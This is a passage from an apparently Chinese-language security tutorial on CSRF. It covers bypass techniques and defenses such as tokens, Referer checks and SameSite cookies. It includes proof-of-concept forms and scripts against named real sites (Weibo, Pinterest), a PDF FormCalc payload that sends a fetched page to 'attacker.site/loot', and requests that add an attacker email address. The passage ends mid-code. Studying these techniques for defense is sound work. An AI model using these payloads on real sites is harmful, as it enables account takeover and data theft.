</figure></p>\n<p>挖掘思路：添加Ogrin头部信息看返回的数据里面有没有Access-Control-Allow-Orgin这个参数出现如果有尝试让他变成任意的url只要这样就可以进行cors劫持了。</p>\n<hr>\n\n<h4 id=\"0x04-CSRF漏洞ByPass\"><a href=\"#0x04-CSRF漏洞ByPass\" class=\"headerlink\" title=\"0x04 CSRF漏洞ByPass\"></a>0x04 CSRF漏洞ByPass</h4><p>描述:CSRF保护绕过我们在漏洞挖掘过程中不难看出，很多时候我们会遇到各种CSRF的防护机制，随便一个网站都有token或者其他的防护机制。<br><br></p>\n<p>下面我们需要了解一下常见的防护方法:</p>\n<ul>\n<li>CSRF token</li>\n<li>Referer Based Protection</li>\n<li>XRSF Header</li>\n<li>verify code</li>\n<li>Seesions timeout</li>\n<li>Double Password </li>\n<li>Double submit cookie</li>\n<li>SameSiteCookies (Chrome, Opera）</li>\n<li>Content-Type based protection</li>\n</ul>\n<p>CSRF-protections绕过方法:</p>\n<ul>\n<li>XSS: 利用XSS盗取CSRF token 从而进行CSRF漏洞利用,以及利用XSS漏洞进行直接的请求饶过Referer限制;</li>\n<li>Dangling markup</li>\n<li>Vulnerable subdomains </li>\n<li>Cookie injection</li>\n<li>Change Content-Type  #重点观察请求体头</li>\n<li>Non-simple Content-Type</li>\n<li>Bad PDF</li>\n<li>Refererspoof</li>\n<li>Delete CSRF Token 或者 Send CSRF Token Empty 或者与token相同长度的任意字符串替换token</li>\n<li>Change Requst Method</li>\n</ul>\n<p>CSRF-ByPass表说明:</p>\n<ul>\n<li>ALL-适用于所有浏览器</li>\n<li>All*-所有浏览器，除了支持相同的浏览器(Chrome和Opera)<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190923112128.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n</li>\n</ul>\n<p><br></p>\n<p><strong>1) Referrer源绕过</strong><br>参考Wooyun: <a href=\"http://www.anquan.us/static/bugs/wooyun-2015-0164067.html\" target=\"_blank\" rel=\"noopener\">http://www.anquan.us/static/bugs/wooyun-2015-0164067.html</a></p>\n<p>该漏洞挖掘流程和大体思路：发现发微博的功能点——尝试利用此功能点发微博——微博发表成功——<code>尝试绕过Referer的限制</code>(重点:查看原本请求来源-进行测试绕过)——绕过referer验证编写Poc进行利用;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#接口</span></span><br><span class=\"line\">http://game.weibo.com/avatar/interface/shareAvatar</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 有检查referrer，但是可以用app.wcdn.cn.*.*类似的域名绕过。</span></span><br><span class=\"line\">&lt;form action=<span class=\"string\">\"http://game.weibo.com/avatar/interface/shareAvatar\"</span> method=<span class=\"string\">\"post\"</span>&gt; </span><br><span class=\"line\">&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"content\"</span> value=<span class=\"string\">\"Hi, testing http://app.wcdn.cn.zhchbin.xyz/\"</span> /&gt; </span><br><span class=\"line\">&lt;input <span class=\"built_in\">type</span>=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"image\"</span> value=<span class=\"string\">\"\"</span> /&gt; </span><br><span class=\"line\">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#浏览器登录微博后，点开这个链接：</span></span><br><span class=\"line\">http://app.wcdn.cn.zhchbin.xyz/</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190922161848.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p>其他方法尝试从其他渠道获得CSRF token<br>描述：利用了Referer泄露获取CSRF token 再利用CSRF token进行CSRF攻击<br>参考示例：<a href=\"http://www.anquan.us/static/bugs/wooyun-2015-090935.html\" target=\"_blank\" rel=\"noopener\">http://www.anquan.us/static/bugs/wooyun-2015-090935.html</a></p>\n<p>常用的绕过方法:</p>\n<ul>\n<li>1.置空：删除referer内容</li>\n<li>2.子域名：因为开发的正则问题可能存在子域名这种绕过方式，比如 <code>https://baidu.weiyigeek.com</code> 我们让baidu变成子域名这样就绕过了比较弱的正则了</li>\n</ul>\n<ul>\n<li>3.修改域名：<a href=\"https://adafsec.weiyigeek.org\" target=\"_blank\" rel=\"noopener\">https://adafsec.weiyigeek.org</a> <a href=\"https://0dafsec.weiyigeek.org\" target=\"_blank\" rel=\"noopener\">https://0dafsec.weiyigeek.org</a> <a href=\"https://Ddafsec.weiyigeek.org利用这种方法也是绕过referer验证的好方法\" target=\"_blank\" rel=\"noopener\">https://Ddafsec.weiyigeek.org利用这种方法也是绕过referer验证的好方法</a></li>\n<li>4.参数： <a href=\"https://weiyigeek.org/?https://dafsec.org\" target=\"_blank\" rel=\"noopener\">https://weiyigeek.org/?https://dafsec.org</a></li>\n</ul>\n<p><br></p>\n<p><strong>2）思路1:删除X-CSRFToken报头然后将POST请求改为GET</strong></p>\n<ul>\n<li>在浏览“<a href=\"https://www.pinterest.com”时，我注意到CSRF令牌是通过http报头“X-CSRFToken”传递的，所以为了验证我使用下面请求的CSRF令牌的实现，这个请求用于修改用户设置\" target=\"_blank\" rel=\"noopener\">https://www.pinterest.com”时，我注意到CSRF令牌是通过http报头“X-CSRFToken”传递的，所以为了验证我使用下面请求的CSRF令牌的实现，这个请求用于修改用户设置</a><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#当POST请求转换为GET时，CSRF令牌没有得到验证</span></span><br><span class=\"line\">POST /_ngjs/resource/UserSettingsResource/update/ HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: www.pinterest.com</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">X-CSRFToken: &lt;CSRF Token&gt; <span class=\"comment\">#删除X-CSRF</span></span><br><span class=\"line\">……..</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;POST Parameters&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<ul>\n<li>1)首先我从上面的POST请求中删除了“X-CSRFToken”报头并转发，在响应中出现了“/resource/UserSettingsResource/update/ 8秒未完成”的错误，表示正在验证CSRF令牌。</li>\n<li>2)然后我将POST请求更改为GET并转发请求(没有“X-CSRFToken”报头)，这次我得到了“200 ok”作为响应。</li>\n</ul>\n<p>总结:<code>利用POST和删除“X-CSRFToken”报头测试成功-构造PoC以GET请求来修改邮箱-成功CSRF攻击后利用修改后邮箱重置密码</code><br>参考案例:<a href=\"https://medium.com/Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276\" target=\"_blank\" rel=\"noopener\">https://medium.com/Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276</a>  #修改了请求方式，并把POST的参数通过GET传入<br>参考案例:<a href=\"http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/\" target=\"_blank\" rel=\"noopener\">http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/</a></p>\n<p><br></p>\n<p><strong>3) Use Bad PDF</strong><br>描述:FormCalc的get()和post()方法允许过滤CSRF-token,其实就是我们的PDF被浏览器解析，因为插件的原因可以进行请求，我们上传恶意的PDF文件在目标网站这样可以绕过referer甚至CSRF token ，这个漏洞和去年(2018)阿里的Chrome支持的PDF跳转是类似的。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#我们只需要制作恶意的PDF文件，在里面插入我们的恶意代码:</span></span><br><span class=\"line\">&lt;script contentType=<span class=\"string\">'application/x-formcalc'</span>&gt;</span><br><span class=\"line\">  var content = GET(<span class=\"string\">\"https://example.com/Settings.action\"</span>); </span><br><span class=\"line\">  Post(<span class=\"string\">\"http://attacker.site/loot\"</span>,content,<span class=\"string\">\"text/plain\"</span>);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>CSRF bypass的PPT思路:制作可利用的PDF文件-&gt;嵌入到csrf-pdf.html中<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190923141433.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>参考连接:<a href=\"https://speakerd.s3.amazonaws.com/presentations/05f698063d87416ba0ec312d0948799b/ZeroNights_2017.pdf\" target=\"_blank\" rel=\"noopener\">https://speakerd.s3.amazonaws.com/presentations/05f698063d87416ba0ec312d0948799b/ZeroNights_2017.pdf</a></p>\n<p><em>利用PDF插件绕过</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /user/add/note HTTP/1.1</span><br><span class=\"line\">Host: example.com</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: en-US,en;q=0.5</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Referer: https://example.com</span><br><span class=\"line\">Cookie: JSESSIONID=728FAA7F23EE00B0EDD56D1E220C011E.jvmroute8081;  <span class=\"comment\">#关键点</span></span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: application/x-thrift  <span class=\"comment\">#关键点</span></span><br><span class=\"line\">Content-Length: 43</span><br><span class=\"line\"></span><br><span class=\"line\">�addNote � � r �</span><br></pre></td></tr></table></figure><br>CSRF-thrift.html<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"keyword\">var</span> request = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"actionscript\">  request.open(<span class=\"string\">'POST'</span>, <span class=\"string\">'https://example.com/add/note'</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">  request.withCredentials = <span class=\"literal\">true</span>;  <span class=\"comment\">//利用CORS</span></span></span><br><span class=\"line\"><span class=\"actionscript\">  request.setRequestHeader(<span class=\"string\">\"Content-type\"</span>, <span class=\"string\">\"text/plain\"</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"keyword\">var</span> data = [<span class=\"string\">'0x80'</span>,<span class=\"string\">'0x01'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x01'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x07'</span>,<span class=\"string\">'0x67'</span>,<span class=\"string\">'0x65'</span>,<span class=\"string\">'0x74'</span>,<span class=\"string\">'0x55'</span>,</span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"string\">'0x73'</span>,<span class=\"string\">'0x65'</span>,<span class=\"string\">'0x72'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>, <span class=\"string\">'0x00'</span>,<span class=\"string\">'0x0b'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x01'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>,<span class=\"string\">'0x00'</span>];</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">var</span> bin = <span class=\"keyword\">new</span> <span class=\"built_in\">Uint8Array</span>(data.length);</span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; data.length; i++) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">  bin[i] = <span class=\"built_in\">parseInt</span>(data[i], <span class=\"number\">16</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  request.send(bin);</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><em>PDF与旁路CRLF注入Referer来源</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script contentType=<span class=\"string\">'application/x-formcalc'</span>&gt;</span><br><span class=\"line\">  Post(<span class=\"string\">\"http://attacker.com:8888/redirect\"</span>,</span><br><span class=\"line\">  <span class=\"string\">\"&#123;\"</span><span class=\"string\">\"action\"</span><span class=\"string\">\":\"</span><span class=\"string\">\"add-user-email\"</span><span class=\"string\">\",\"</span><span class=\"string\">\"Email\"</span><span class=\"string\">\":\"</span><span class=\"string\">\"attacker@evil.com\"</span><span class=\"string\">\"&#125;\"</span>,</span><br><span class=\"line\">  <span class=\"string\">\"application/json&amp;#x0a;&amp;#x0d;Referer;&amp;#x20;http://example.com\"</span>)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190923145136.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<p><strong>4) 旁路cookie注入绕过</strong><br>描述:攻击者可以通过cookie注入绕过双重提交cookie保护<br>cookie注入的方法:</p>\n<ul>\n<li>CRLF-injection (HTML响应拆分注入漏洞)</li>\n<li>Browser bugs (like CVE-2016-9078 in Firefox)</li>\n</ul>\n<p><br></p>\n<p><strong>5) Content-Type绕过方法</strong><br>描述:该类漏洞主要是利用的程序后端没有验证(Calidate)<code>Content-Type</code>头;<br>攻击者只能通过HTML表单或XHR api 发送 “简单” 的内容类型:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">* text/plain</span><br><span class=\"line\">* application/x-www-form-urlencoded</span><br><span class=\"line\">* multipart/form-data</span><br></pre></td></tr></table></figure></p>\n<p>利用方式:sendbeacon()调用，允许发送具有任意内容类型的POST请求<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  <span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">jsonreq</span></span>() &#123;</span><br><span class=\"line\">    var data = <span class=\"string\">'&#123;\"action\":\"add-user-email\",\"Email\":\"attacker@evil.com\"&#125;'</span>;</span><br><span class=\"line\">    var blob = new Blob([data], &#123;<span class=\"built_in\">type</span> : <span class=\"string\">'application/json;charset=utf-8'</span>&#125;);</span><br><span class=\"line\">    navigator.sendBeacon(<span class=\"string\">'https://example.com/home/rpc'</span></span><br><span class=\"line\">    , blob );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  jsonreq();</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<hr>\n\n<h4 id=\"0x05-安全防御\"><a href=\"#0x05-安全防御\" class=\"headerlink\" title=\"0x05 安全防御\"></a>0x05 安全防御</h4><p>在业界目前防御 CSRF 攻击主要有几种策略：</p>\n<ul>\n<li>验证 HTTP Referer 字段；</li>\n<li>在请求地址中添加 token 并验证；</li>\n<li>在 HTTP 头中自定义属性并验证；</li>\n<li>验证码二次确认并验证。<br><br></li>\n</ul>\n<h5 id=\"开发者和使用者\"><a href=\"#开发者和使用者\" class=\"headerlink\" title=\"开发者和使用者\"></a>开发者和使用者</h5><p><strong>1）验证码-二次确认</strong></p>\n<ul>\n<li>当进行敏感操作的时候需要用户进行确认，输入验证码或者密码，二次确认校验通过后才进行真正的操作。</li>\n<li>缺点：如果我不是转账,只是发微博,评论,点赞等简单的社交操作.每次输入验证码非常影响用户体验，所以这种方式只适合在极其敏感,需要用户再三确认的场景下使用，甚至非常敏感的操作应该要使用短信验证这种；</li>\n</ul>\n<p><br></p>\n<p><strong>2）Referer校验</strong></p>\n<ul>\n<li>利用HTTP头中的Referer判断请求来源是否合法，攻击者网站上发出的CSRF请求一般情况是不会携带Referer为网站A网址的，所以服务器端可以简单以Referer来判断请求是否是来源于自己的网站，从而拒绝掉CSRF的请求。</li>\n<li>优点：简单易行，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</li>\n<li>缺点：<br>1.Referer 的值是由浏览器提供的，不可全信低版本浏览器下Referer存在伪造风险。<br>2.用户自己可以设置浏览器使其在发送请求时不再提供 Referer时，网站将拒绝合法用户的访问。<br>3.在 http和https间跳转出于安全的考虑浏览器不会发送Referer<br>4.img 标签引用了一个非图片网址或者其他情况可能存在为空抑或服务器端代码不严谨等情况<br><br></li>\n</ul>\n<p><strong>3）Anti CSRF Token校验</strong><br><em>CSRF 为什么能够攻击成功？</em><br>答：其本质原因是重要操作的所有参数都是可以被攻击者猜到的，而攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中<br>解决方向：在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中，以HTTP请求参数的形式加入一个随机产生的 token交由服务端验证</p>\n<ul>\n<li><p>开发者可以在HTTP请求中以参数的形式加入一个随机产生的token(要求攻击者无法伪造)，对于token错误的请求，则认为是CSRF攻击，并拒绝该请求。<br><code>http://host/path/delete?username=abcd&amp;item=123&amp;token=[random(seed)]</code><br>一次性token是比较常用的方式，每次用户请求返回后，下发一个token，在下次表单提交或者HTTP GET的方式请求敏感数据时都携带该Token，服务器端对token进行校验并刷新Token的值，重新下发。</p>\n</li>\n<li><p>在CSRF攻击的情况下，网站B是拿不到网站A表单里的token的，所以服务器可以快速的验证出有效的请求。<br>在实际应用开发之中，Token还可以放在用户的session中，或者浏览器Cookie中，然后与表单里面的Token（一般是hidden）相比较得出，请求是不是合法的，</p>\n</li>\n</ul>\n<p>Token的使用原则：</p>\n<ul>\n<li><p>使用Token应该注意其保密性，Token如果出现在某个URL中，则可能会通过Referer的方式泄露，这时用户需要点击当前页面中逻辑业务，如果这样的情况下，页面包含了一个攻击者指定的地址图片，会将Token发送到特点的网站中。</p>\n</li>\n<li><p>优点：比检查 Referer 要安全一些，并且不涉及用户隐私。 </p>\n</li>\n<li>缺点：对所有请求都添加token比较困难，难以保证 token 本身的安全，依然会被利用获取到token，一次性Token的缺点是页面并发请求不被支持。<br><br></li>\n</ul>\n<p><strong>4）在 HTTP 头中自定义属性并验证+One-Time Tokens</strong><br>所以关键数据操作的请求，最好使用POST请求，限制GET请求的数据，以Form表单或者AJax进行提交，可以避免Token泄露，使用ajax还可以采用校验X-Requested-With头。</p>\n<p>下面有一种很好用的Token验证方法,在HTTP头中自定义属性并验证，如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#自定义HTTP头X-CSRF-Token。先把token放入meta：</span></span><br><span class=\"line\">&lt;meta name=<span class=\"string\">\"csrf-token\"</span> content=<span class=\"string\">\"&#123;&#123; csrf_token() &#125;&#125;\"</span>&gt;</span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">#然后在全局Ajax中使用这种方式设置X-CSRF-Token请求头并提交：</span></span><br><span class=\"line\">$.ajaxSetup(&#123; headers: &#123;  <span class=\"string\">'X-CSRF-TOKEN'</span>: $(<span class=\"string\">'meta[name=\"csrf-token\"]'</span>).attr(<span class=\"string\">'content'</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">每次Ajax请求则会自动加上自定义的HTTP头X-CSRF-Token。</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>突破点：此方法的关键点在于token不能被攻击者的代码获取，倘若网站存在XSS漏洞，那么攻击者是可以结合XSS获取到Token从而进行CSRF攻击（也叫XSRF），所以要解决CSRF要先解决XSS，否则也是枉然.</li>\n<li><p>防御：将token放到 HTTP 头中自定义的属性里，通过 XMLHttpRequest 的异步请求交由后端校验，并且一次有效。</p>\n</li>\n<li><p>优点：统一管理token输入输出，可以保证token的安全性 </p>\n</li>\n<li>缺点：有局限性，无法在非异步的请求上实施<br><br></li>\n</ul>\n<p><strong>5）建立日志系统</strong><br>比如严格的日志系统，这个在企业防护CSRF中，算是事后防护了，能甄别一定的CSRF攻击。</p>\n<p><br></p>\n<p><strong>6）用户个人习惯</strong><br>用户可通过在浏览其它站点前登出站点或者在浏览器会话结束后清理浏览器的cookie(浏览器自带退出浏览器后清除缓存))</p>\n<p><br></p>\n<h5 id=\"浏览器特性防御\"><a href=\"#浏览器特性防御\" class=\"headerlink\" title=\"浏览器特性防御\"></a>浏览器特性防御</h5><p><strong>Chrome 浏览器</strong><br>描述:可以在第三方网站访问时不带 Cookies ，也就是说 Cookies 只有本站能用，来自第三方的访问都不能使用。</p>\n<p>使用方式：是在Set-Cookie 的时候加上一个属性 <code>SameSite</code> 它的值有两个：</p>\n<ul>\n<li>strict ：任何来自第三方的请求都不能使用 Cookies,包括通过链接点进来的</li>\n</ul>\n<ul>\n<li>lex ：只有比较敏感的操作不带 Cookies ,比如表单提交<br>针对 CSRF 我们可以将 Cookies 设置成SameSite: strict的就可以有效防御 CSRF 了，比较可惜的是，目前只有 Chrome 才支持这一属性。</li>\n</ul>\n<hr>\n\n<h4 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h4><p>个人学习心得总结:</p>\n<ul>\n<li><p>CSRF漏洞为了扩大其危害程度常常与XSS漏洞相结合打组合拳来进行使用;</p>\n</li>\n<li><p>CSRF漏洞提交方式总结:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"http://www.example.com/api/setusername?username=CSRFd\"</span>&gt;</span>Click Me<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://www.example.com/api/setusername?username=CSRFd\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://www.example.com/api/setusername\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"text/plain\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"username\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"CSRFd\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Submit Request\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">id</span>=<span class=\"string\">\"autosubmit\"</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://www.example.com/api/setusername\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"text/plain\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&amp;&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">\"username\"</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"CSRFd\"</span> /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Submit Request\"</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"autosubmit\"</span>).submit();</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.open(<span class=\"string\">\"GET\"</span>, <span class=\"string\">\"http://www.example.com/api/currentuser\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">  xhr.send();</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"actionscript\">  <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.open(<span class=\"string\">\"POST\"</span>, <span class=\"string\">\"http://www.example.com/api/setrole\"</span>);</span></span><br><span class=\"line\"><span class=\"actionscript\">  xhr.setRequestHeader(<span 